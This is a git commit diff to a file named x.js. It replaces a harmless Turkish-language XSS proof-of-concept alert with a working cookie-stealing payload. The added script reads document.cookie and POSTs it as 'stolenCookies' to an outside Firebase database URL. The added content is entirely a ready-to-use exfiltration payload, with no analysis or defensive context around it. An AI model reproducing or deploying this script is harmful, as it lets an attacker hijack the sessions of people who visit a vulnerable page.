719daa120f99377d2bdf1d6135c055a97a03e643
ibo442544 <92678011+ibo442544@users.noreply.github.com>
2025-05-17 12:04:49 +0300

    x.js

--- x.js
+++ x.js
@@ -1,2 +1,8 @@
-alert("XSS açığı çalıştı! Güvensiz Ajax çağrısı tespit edildi.");
-console.log("Cookie bilgisi:", document.cookie);
+<script>
+var cookies = document.cookie;
+var firebaseUrl = "https://yaflfest-970fa-default-rtdb.firebaseio.com/";
+var xhr = new XMLHttpRequest();
+xhr.open("POST", firebaseUrl, true);
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send(JSON.stringify({ stolenCookies: cookies }));
+</script>
